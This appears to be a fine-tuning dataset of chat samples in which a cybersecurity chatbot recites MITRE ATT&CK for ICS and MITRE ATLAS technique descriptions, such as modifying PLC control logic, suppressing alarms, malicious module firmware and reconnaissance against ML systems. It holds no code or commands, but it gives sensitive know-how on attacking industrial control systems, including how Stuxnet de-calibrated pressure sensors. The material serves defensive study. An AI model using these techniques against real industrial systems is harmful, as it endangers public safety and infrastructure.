{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Engineering Workstation Compromise' and with the Id: T0818 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Engineering Workstation Compromise' and with the Id: T0818 is described as follows: Adversaries will compromise and gain control of an engineering workstation for Initial Access into the control system environment. Access to an engineering workstation may occur through or physical means, such as a Valid Accounts with privileged access or infection by removable media. A dual-homed engineering workstation may allow the adversary access into multiple networks. For example, unsegregated process control, safety system, or information system networks. An Engineering Workstation is designed as a reliable computing platform that configures, maintains, and diagnoses control system equipment and applications. Compromise of an engineering workstation may provide access to, and control of, other control system applications and equipment. In the Maroochy attack, the adversary utilized a computer, possibly stolen, with proprietary engineering software to communicate with a wastewater system.. The systems targeted by this attack pattern are: Engineering Workstation ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Connection Proxy' and with the Id: T0884 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Connection Proxy' and with the Id: T0884 is described as follows: Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications.The definition of a proxy can also be expanded to encompass trust relationships between networks in peer-to-peer, mesh, or trusted connections between networks consisting of hosts or systems that regularly communicate with each other.The network may be within a single organization or across multiple organizations with trust relationships. Adversaries could use these types of relationships to manage command and control communications, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. (Citation: Enterprise ATT&CK January 2018). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Standard Application Layer Protocol' and with the Id: T0869 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Standard Application Layer Protocol' and with the Id: T0869 is described as follows: Adversaries may establish command and control capabilities over commonly used application layer protocols such as HTTP(S), OPC, RDP, telnet, DNP3, and modbus. These protocols may be used to disguise adversary actions as benign network traffic. Standard protocols may be seen on their associated port or in some cases over a non-standard port.  Adversaries may use these protocols to reach out of the network for command and control, or in some cases to other infected devices within the network.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Modify Control Logic' and with the Id: T0833 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Modify Control Logic' and with the Id: T0833 is described as follows: Adversaries may place malicious code in a system, which can cause the system to malfunction by modifying its control logic. Control system devices use programming languages (e.g. relay ladder logic) to control physical processes by affecting actuators, which cause machines to operate, based on environment sensor readings. These devices often include the ability to perform remote control logic updates. Program code is normally edited in a vendor-specific Integrated Development Environment (IDE) that relies on proprietary tools and features. These IDEs allow an engineer to perform host target development and may have the ability to run the code on the machine it is programmed for. The IDE will transmit the control logic to the testing device, and will perform the required device-specific functions to apply the changes and make them active.An adversary may attempt to use this host target IDE to modify device control logic. Even though proprietary tools are often used to edit and update control logic, the process can usually be reverse-engineered and reproduced with open-source tools.An adversary can de-calibrate a sensor by removing functions in control logic that account for sensor error. This can be used to change a control process without actually spoofing command messages to a controller or device. It is believed this process happened in the lesser known over-pressurizer attacks build into Stuxnet. Pressure sensors are not perfect at translating pressure into an analog output signal, but their errors can be corrected by calibration. The pressure controller can be told what the \u201creal\u201d pressure is for given analog signals and then automatically linearize the measurement to what would be the \u201creal\u201d pressure. If the linearization is overwritten by malicious code on the S7-417 controller, analog pressure readings will be \u201ccorrected\u201d during the attack by the pressure controller, which then interprets all analog pressure readings as perfectly normal pressure no matter how high or low their analog values are. The pressure controller then acts accordingly by never opening the stage exhaust valves. In the meantime, actual pressure keeps rising. (Citation: Stuxnet - Langner - 201311)In the Maroochy Attack, Vitek Boden gained remote computer access to the control system and altered data so that whatever function should have occurred at affected pumping stations did not occur or occurred in a different way. The software program installed in the laptop was one developed by Hunter Watertech for its use in changing configurations in the PDS computers. This ultimately led to 800,000 liters of raw sewage being spilled out into the community. (Citation: Maroochy - MITRE - 200808). The systems targeted by this attack pattern are: Safety Instrumented System/Protection Relay, Field Controller/RTU/PLC/IED ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Remote Services' and with the Id: T0886 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Remote Services' and with the Id: T0886 is described as follows: Adversaries may leverage remote services to move between assets and network segments. These services are often used to allow operators to interact with systems remotely within the network, some examples are RDP, SMB, SSH, and other similar mechanisms. (Citation: Blake Johnson, Dan Caban, Marina Krotofil, Dan Scali, Nathan Brubaker, Christopher Glyer December 2017) (Citation: Dragos December 2017) (Citation: Joe Slowik April 2019) Remote services could be used to support remote access, data transmission, authentication, name resolution, and other remote functions. Further, remote services may be necessary to allow operators and administrators to configure systems within the network from their engineering or management workstations. An adversary may use this technique to access devices which may be dual-homed (Citation: Blake Johnson, Dan Caban, Marina Krotofil, Dan Scali, Nathan Brubaker, Christopher Glyer December 2017) to multiple network segments, and can be used for [Program Download](https://attack.mitre.org/techniques/T0843) or to execute attacks on control devices directly through [Valid Accounts](https://attack.mitre.org/techniques/T0859).Specific remote services (RDP & VNC) may be a precursor to enable [Graphical User Interface](https://attack.mitre.org/techniques/T0823) execution on devices such as HMIs or engineering workstation software.Based on incident data, CISA and FBI assessed that Chinese state-sponsored actors also compromised various authorized remote access channels, including systems designed to transfer data and/or allow access between corporate and ICS networks.  (Citation: CISA AA21-201A Pipeline Intrusion July 2021). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'I/O Module Discovery' and with the Id: T0824 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'I/O Module Discovery' and with the Id: T0824 is described as follows: Adversaries may use input/output (I/O) module discovery to gather key information about a control system device. An I/O module is a device that allows the control system device to either receive or send signals to other devices. These signals can be analog or digital, and may support a number of different protocols. Devices are often able to use attachable I/O modules to increase the number of inputs and outputs that it can utilize. An adversary with access to a device can use native device functions to enumerate I/O modules that are connected to the device. Information regarding the I/O modules can aid the adversary in understanding related control processes.. The systems targeted by this attack pattern are: Windows, Field Controller/RTU/PLC/IED ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Denial of Control' and with the Id: T0813 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Denial of Control' and with the Id: T0813 is described as follows: Adversaries may cause a denial of control to temporarily prevent operators and engineers from interacting with process controls. An adversary may attempt to deny process control access to cause a temporary loss of communication with the control device or to prevent operator adjustment of process controls. An affected process may still be operating during the period of control loss, but not necessarily in a desired state. (Citation: Corero) (Citation: Michael J. Assante and Robert M. Lee) (Citation: Tyson Macaulay)In the 2017 Dallas Siren incident operators were unable to disable the false alarms from the Office of Emergency Management headquarters. (Citation: Mark Loveless April 2017). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Modify Alarm Settings' and with the Id: T0838 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Modify Alarm Settings' and with the Id: T0838 is described as follows: Adversaries may modify alarm settings to prevent alerts that may inform operators of their presence or to prevent responses to dangerous and unintended scenarios. Reporting messages are a standard part of data acquisition in control systems. Reporting messages are used as a way to transmit system state information and acknowledgements that specific actions have occurred. These messages provide vital information for the management of a physical process, and keep operators, engineers, and administrators aware of the state of system devices and physical processes. If an adversary is able to change the reporting settings, certain events could be prevented from being reported. This type of modification can also prevent operators or devices from performing actions to keep the system in a safe state. If critical reporting messages cannot trigger these actions then a [Impact](https://attack.mitre.org/tactics/TA0105) could occur. In ICS environments, the adversary may have to use [Alarm Suppression](https://attack.mitre.org/techniques/T0878) or contend with multiple alarms and/or alarm propagation to achieve a specific goal to evade detection or prevent intended responses from occurring. (Citation: Jos Wetzels, Marina Krotofil 2019)  Methods of suppression often rely on modification of alarm settings, such as modifying in memory code to fixed values or tampering with assembly level instruction code. . The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Commonly Used Port' and with the Id: T0885 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Commonly Used Port' and with the Id: T0885 is described as follows: Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend in with normal network activity, to avoid more detailed inspection. They may use the protocol associated with the port, or a completely different protocol. They may use commonly open ports, such as the examples provided below.   * TCP:80 (HTTP)  * TCP:443 (HTTPS)  * TCP/UDP:53 (DNS)  * TCP:1024-4999 (OPC on XP/Win2k3)  * TCP:49152-65535 (OPC on Vista and later)  * TCP:23 (TELNET)  * UDP:161 (SNMP)  * TCP:502 (MODBUS)  * TCP:102 (S7comm/ISO-TSAP)  * TCP:20000 (DNP3)  * TCP:44818 (Ethernet/IP). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Project File Infection' and with the Id: T0873 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Project File Infection' and with the Id: T0873 is described as follows: Adversaries may attempt to infect project files with malicious code. These project files may consist of objects, program organization units, variables such as tags, documentation, and other configurations needed for PLC programs to function. (Citation: Beckhoff) Using built in functions of the engineering software, adversaries may be able to download an infected program to a PLC in the operating environment enabling further [Execution](https://attack.mitre.org/tactics/TA0104) and [Persistence](https://attack.mitre.org/tactics/TA0110) techniques. (Citation: PLCdev) Adversaries may export their own code into project files with conditions to execute at specific intervals. (Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011) Malicious programs allow adversaries control of all aspects of the process enabled by the PLC. Once the project file is downloaded to a PLC the workstation device may be disconnected with the infected project file still executing. (Citation: PLCdev). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Network Connection Enumeration' and with the Id: T0840 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Network Connection Enumeration' and with the Id: T0840 is described as follows: Adversaries may perform network connection enumeration to discover information about device communication patterns. If an adversary can inspect the state of a network connection with tools, such as Netstat(Citation: Netstat), in conjunction with [System Firmware](https://attack.mitre.org/techniques/T0857), then they can determine the role of certain devices on the network  (Citation: MITRE). The adversary can also use [Network Sniffing](https://attack.mitre.org/techniques/T0842) to watch network traffic for details about the source, destination, protocol, and content.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Lateral Tool Transfer' and with the Id: T0867 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Lateral Tool Transfer' and with the Id: T0867 is described as follows: Adversaries may transfer tools or other files from one system to another to stage adversary tools or other files over the course of an operation. (Citation: Enterprise ATT&CK) Copying of files may also be performed laterally between internal victim systems to support Lateral Movement with remote Execution using inherent file sharing protocols such as file sharing over SMB to connected network shares. (Citation: Enterprise ATT&CK)In control systems environments, malware may use SMB and other file sharing protocols to move laterally through industrial networks.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Module Firmware' and with the Id: T0839 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Module Firmware' and with the Id: T0839 is described as follows: Adversaries may install malicious or vulnerable firmware onto modular hardware devices. Control system devices often contain modular hardware devices. These devices may have their own set of firmware that is separate from the firmware of the main control system equipment.   This technique is similar to [System Firmware](https://attack.mitre.org/techniques/T0857), but is conducted on other system components that may not have the same capabilities or level of integrity checking. Although it results in a device re-image, malicious device firmware may provide persistent access to remaining devices. (Citation: Daniel Peck,  Dale Peterson January 2009)  An easy point of access for an adversary is the Ethernet card, which may have its own CPU, RAM, and operating system. The adversary may attack and likely exploit the computer on an Ethernet card. Exploitation of the Ethernet card computer may enable the adversary to accomplish additional attacks, such as the following: (Citation: Daniel Peck,  Dale Peterson January 2009)  * Delayed Attack - The adversary may stage an attack in advance and choose when to launch it, such as at a particularly damaging time.  * Brick the Ethernet Card - Malicious firmware may be programmed to result in an Ethernet card failure, requiring a factory return.  * Random Attack or Failure - The adversary may load malicious firmware onto multiple field devices. Execution of an attack and the time it occurs is generated by a pseudo-random number generator.   * A Field Device Worm - The adversary may choose to identify all field devices of the same model, with the end goal of performing a device-wide compromise.  * Attack Other Cards on the Field Device - Although it is not the most important module in a field device, the Ethernet card is most accessible to the adversary and malware. Compromise of the Ethernet card may provide a more direct route to compromising other modules, such as the CPU module.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Internet Accessible Device' and with the Id: T0883 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Internet Accessible Device' and with the Id: T0883 is described as follows: Adversaries may gain access into industrial environments through systems exposed directly to the internet for remote access rather than through [External Remote Services](https://attack.mitre.org/techniques/T0822). Internet Accessible Devices are exposed to the internet unintentionally or intentionally without adequate protections. This may allow for adversaries to move directly into the control system network. Access onto these devices is accomplished without the use of exploits, these would be represented within the [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T0819) technique.Adversaries may leverage built in functions for remote access which may not be protected or utilize minimal legacy protections that may be targeted. (Citation: NCCIC January 2014) These services may be discoverable through the use of online scanning tools. In the case of the Bowman dam incident, adversaries leveraged access to the dam control network through a cellular modem. Access to the device was protected by password authentication, although the application was vulnerable to brute forcing. (Citation: NCCIC January 2014) (Citation: Danny Yadron December 2015) (Citation: Mark Thompson March 2016)In Trend Micros manufacturing deception operations adversaries were detected leveraging direct internet access to an ICS environment through the exposure of operational protocols such as Siemens S7, Omron FINS, and EtherNet/IP, in addition to misconfigured VNC access. (Citation: Stephen Hilt, Federico Maggi, Charles Perine, Lord Remorin, Martin Rsler, and Rainer Vosseler). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data from Local System' and with the Id: T0893 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data from Local System' and with the Id: T0893 is described as follows: Adversaries may target and collect data from local system sources, such as file systems, configuration files, or local databases. This can include sensitive data such as specifications, schematics, or diagrams of control system layouts, devices, and processes.Adversaries may do this using [Command-Line Interface](https://attack.mitre.org/techniques/T0807) or [Scripting](https://attack.mitre.org/techniques/T0853) techniques to interact with the file system to gather information. Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T0802) on the local system. . The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Change Credential' and with the Id: T0892 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Change Credential' and with the Id: T0892 is described as follows: Adversaries may modify software and device credentials to prevent operator and responder access. Depending on the device, the modification or addition of this password could prevent any device configuration actions from being accomplished and may require a factory reset or replacement of hardware. These credentials are often built-in features provided by the device vendors as a means to restrict access to management interfaces.An adversary with access to valid or hardcoded credentials could change the credential to prevent future authorized device access. Change Credential may be especially damaging when paired with other techniques such as Modify Program, Data Destruction, or Modify Controller Tasking. In these cases, a device\u2019s configuration may be destroyed or include malicious actions for the process environment, which cannot not be removed through normal device configuration actions. Additionally, recovery of the device and original configuration may be difficult depending on the features provided by the device. In some cases, these passwords cannot be removed onsite and may require that the device be sent back to the vendor for additional recovery steps.A chain of incidents occurred in Germany, where adversaries locked operators out of their building automation system (BAS) controllers by enabling a previously unset BCU key. (Citation: German BAS Lockout Dec 2021) . The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Modify Program' and with the Id: T0889 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Modify Program' and with the Id: T0889 is described as follows: Adversaries may modify or add a program on a controller to affect how it interacts with the physical process, peripheral devices and other hosts on the network. Modification to controller programs can be accomplished using a Program Download in addition to other types of program modification such as online edit and program append. Program modification encompasses the addition and modification of instructions and logic contained in Program Organization Units (POU)  (Citation: IEC February 2013) and similar programming elements found on controllers. This can include, for example, adding new functions to a controller, modifying the logic in existing functions and making new calls from one function to another. Some programs may allow an adversary to interact directly with the native API of the controller to take advantage of obscure features or vulnerabilities.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Search for Victim's Publicly Available Research Materials' and with the Id: AML.T0000 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Search for Victim's Publicly Available Research Materials' and with the Id: AML.T0000 is described as follows: Adversaries may search publicly available research to learn how and where machine learning is used within a victim organization.The adversary can use this information to identify targets for attack, or to tailor an existing attack to make it more effective.Organizations often use open source model architectures trained on additional proprietary data in production.Knowledge of this underlying architecture allows the adversary to craft more realistic proxy models ([Create Proxy ML Model](/techniques/AML.T0005)).An adversary can search these resources for publications for authors employed at the victim organization.Research materials may exist as academic papers published in [Journals and Conference Proceedings](/techniques/AML.T0000.000), or stored in [Pre-Print Repositories](/techniques/AML.T0000.001), as well as [Technical Blogs](/techniques/AML.T0000.002).. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Journals and Conference Proceedings' and with the Id: AML.T0000.000 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Journals and Conference Proceedings' and with the Id: AML.T0000.000 is described as follows: Many of the publications accepted at premier machine learning conferences and journals come from commercial labs.Some journals and conferences are open access, others may require paying for access or a membership.These publications will often describe in detail all aspects of a particular approach for reproducibility.This information can be used by adversaries to implement the paper.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Pre-Print Repositories' and with the Id: AML.T0000.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Pre-Print Repositories' and with the Id: AML.T0000.001 is described as follows: Pre-Print repositories, such as arXiv, contain the latest academic research papers that haven't been peer reviewed.They may contain research notes, or technical reports that aren't typically published in journals or conference proceedings.Pre-print repositories also serve as a central location to share papers that have been accepted to journals.Searching pre-print repositories  provide adversaries with a relatively up-to-date view of what researchers in the victim organization are working on.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Technical Blogs' and with the Id: AML.T0000.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Technical Blogs' and with the Id: AML.T0000.002 is described as follows: Research labs at academic institutions and Company R&D divisions often have blogs that highlight their use of machine learning and its application to the organizations unique problems.Individual researchers also frequently document their work in blogposts.An adversary may search for posts made by the target victim organization or its employees.In comparison to [Journals and Conference Proceedings](/techniques/AML.T0000.000) and [Pre-Print Repositories](/techniques/AML.T0000.001) this material will often contain more practical aspects of the machine learning system.This could include underlying technologies and frameworks used, and possibly some information about the API access and use case.This will help the adversary better understand how that organization is using machine learning internally and the details of their approach that could aid in tailoring an attack.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Search for Publicly Available Adversarial Vulnerability Analysis' and with the Id: AML.T0001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Search for Publicly Available Adversarial Vulnerability Analysis' and with the Id: AML.T0001 is described as follows: Much like the [Search for Victim's Publicly Available Research Materials](/techniques/AML.T0000), there is often ample research available on the vulnerabilities of common models. Once a target has been identified, an adversary will likely try to identify any pre-existing work that has been done for this class of models.This will include not only reading academic papers that may identify the particulars of a successful attack, but also identifying pre-existing implementations of those attacks. The adversary may obtain [Adversarial ML Attack Implementations](/techniques/AML.T0016.000) or develop their own [Adversarial ML Attacks](/techniques/AML.T0017.000) if necessary.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Search Victim-Owned Websites' and with the Id: AML.T0003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Search Victim-Owned Websites' and with the Id: AML.T0003 is described as follows: Adversaries may search websites owned by the victim for information that can be used during targeting.Victim-owned websites may contain technical details about their ML-enabled products or services.Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info.These sites may also have details highlighting business operations and relationships.Adversaries may search victim-owned websites to gather actionable information.This information may help adversaries tailor their attacks (e.g. [Adversarial ML Attacks](/techniques/AML.T0017.000) or [Manual Modification](/techniques/AML.T0043.003)).Information from these sources may reveal opportunities for other forms of reconnaissance (e.g. [Search for Victim's Publicly Available Research Materials](/techniques/AML.T0000) or [Search for Publicly Available Adversarial Vulnerability Analysis](/techniques/AML.T0001)). The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Search Application Repositories' and with the Id: AML.T0004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Search Application Repositories' and with the Id: AML.T0004 is described as follows: Adversaries may search open application repositories during targeting.Examples of these include Google Play, the iOS App store, the macOS App Store, and the Microsoft Store.Adversaries may craft search queries seeking applications that contain a ML-enabled components.Frequently, the next step is to [Acquire Public ML Artifacts](/techniques/AML.T0002).. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Active Scanning' and with the Id: AML.T0006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Active Scanning' and with the Id: AML.T0006 is described as follows: An adversary may probe or scan the victim system to gather information for targeting.This is distinct from other reconnaissance techniques that do not involve direct interaction with the victim system.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Acquire Public ML Artifacts' and with the Id: AML.T0002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Acquire Public ML Artifacts' and with the Id: AML.T0002 is described as follows: Adversaries may search public sources, including cloud storage, public-facing services, and software or data repositories, to identify machine learning artifacts.These machine learning artifacts may include the software stack used to train and deploy models, training and testing data, model configurations and parameters.An adversary will be particularly interested in artifacts hosted by or associated with the victim organization as they may represent what that organization uses in a production environment.Adversaries may identify artifact repositories via other resources associated with the victim organization (e.g. [Search Victim-Owned Websites](/techniques/AML.T0003) or [Search for Victim's Publicly Available Research Materials](/techniques/AML.T0000)).These ML artifacts often provide adversaries with details of the ML task and approach.ML artifacts can aid in an adversary's ability to [Create Proxy ML Model](/techniques/AML.T0005).If these artifacts include pieces of the actual model in production, they can be used to directly [Craft Adversarial Data](/techniques/AML.T0043).Acquiring some artifacts requires registration (providing user details such email/name), AWS keys, or written requests, and may require the adversary to [Establish Accounts](/techniques/AML.T0021).Artifacts might be hosted on victim-controlled infrastructure, providing the victim with some information on who has accessed that data.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Datasets' and with the Id: AML.T0002.000 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Datasets' and with the Id: AML.T0002.000 is described as follows: Adversaries may collect public datasets to use in their operations.Datasets used by the victim organization or datasets that are representative of the data used by the victim organization may be valuable to adversaries.Datasets can be stored in cloud storage, or on victim-owned websites.Some datasets require the adversary to [Establish Accounts](/techniques/AML.T0021) for access.Acquired datasets help the adversary advance their operations, stage attacks,  and tailor attacks to the victim organization.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Models' and with the Id: AML.T0002.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Models' and with the Id: AML.T0002.001 is described as follows: Adversaries may acquire public models to use in their operations.Adversaries may seek models used by the victim organization or models that are representative of those used by the victim organization.Representative models may include model architectures, or pre-trained models which define the architecture as well as model parameters from training on a dataset.The adversary may search public sources for common model architecture configuration file formats such as YAML or Python configuration files, and common model storage file formats such as ONNX (.onnx), HDF5 (.h5), Pickle (.pkl), PyTorch (.pth), or TensorFlow (.pb, .tflite).Acquired models are useful in advancing the adversary's operations and are frequently used to tailor attacks to the victim model.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Obtain Capabilities' and with the Id: AML.T0016 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Obtain Capabilities' and with the Id: AML.T0016 is described as follows: Adversaries may search for and obtain software capabilities for use in their operations.Capabilities may be specific to ML-based attacks [Adversarial ML Attack Implementations](/techniques/AML.T0016.000) or generic software tools repurposed for malicious intent ([Software Tools](/techniques/AML.T0016.001)). In both instances, an adversary may modify or customize the capability to aid in targeting a particular ML system.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Adversarial ML Attack Implementations' and with the Id: AML.T0016.000 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Adversarial ML Attack Implementations' and with the Id: AML.T0016.000 is described as follows: Adversaries may search for existing open source implementations of machine learning attacks. The research community often publishes their code for reproducibility and to further future research. Libraries intended for research purposes, such as CleverHans, the Adversarial Robustness Toolbox, and FoolBox, can be weaponized by an adversary. Adversaries may also obtain and use tools that were not originally designed for adversarial ML attacks as part of their attack.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Software Tools' and with the Id: AML.T0016.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Software Tools' and with the Id: AML.T0016.001 is described as follows: Adversaries may search for and obtain software tools to support their operations.Software designed for legitimate use may be repurposed by an adversary for malicious intent.An adversary may modify or customize software tools to achieve their purpose.Software tools used to support attacks on ML systems are not necessarily ML-based themselves.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Develop Capabilities' and with the Id: AML.T0017 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Develop Capabilities' and with the Id: AML.T0017 is described as follows: Adversaries may develop their own capabilities to support operations. This process encompasses identifying requirements, building solutions, and deploying capabilities. Capabilities used to support attacks on ML systems are not necessarily ML-based themselves. Examples include setting up websites with adversarial information or creating Jupyter notebooks with obfuscated exfiltration code.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Adversarial ML Attacks' and with the Id: AML.T0017.000 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Adversarial ML Attacks' and with the Id: AML.T0017.000 is described as follows: Adversaries may develop their own adversarial attacks.They may leverage existing libraries as a starting point ([Adversarial ML Attack Implementations](/techniques/AML.T0016.000)).They may implement ideas described in public research papers or develop custom made attacks for the victim model.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Acquire Infrastructure' and with the Id: AML.T0008 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Acquire Infrastructure' and with the Id: AML.T0008 is described as follows: Adversaries may buy, lease, or rent infrastructure for use throughout their operation.A wide variety of infrastructure exists for hosting and orchestrating adversary operations.Infrastructure solutions include physical or cloud servers, domains, mobile devices, and third-party web services.Free resources may also be used, but they are typically limited.Use of these infrastructure solutions allows an adversary to stage, launch, and execute an operation.Solutions may help adversary operations blend in with traffic that is seen as normal, such as contact to third-party web services.Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.. The systems targeted by this attack pattern are: LLM model ."}]}
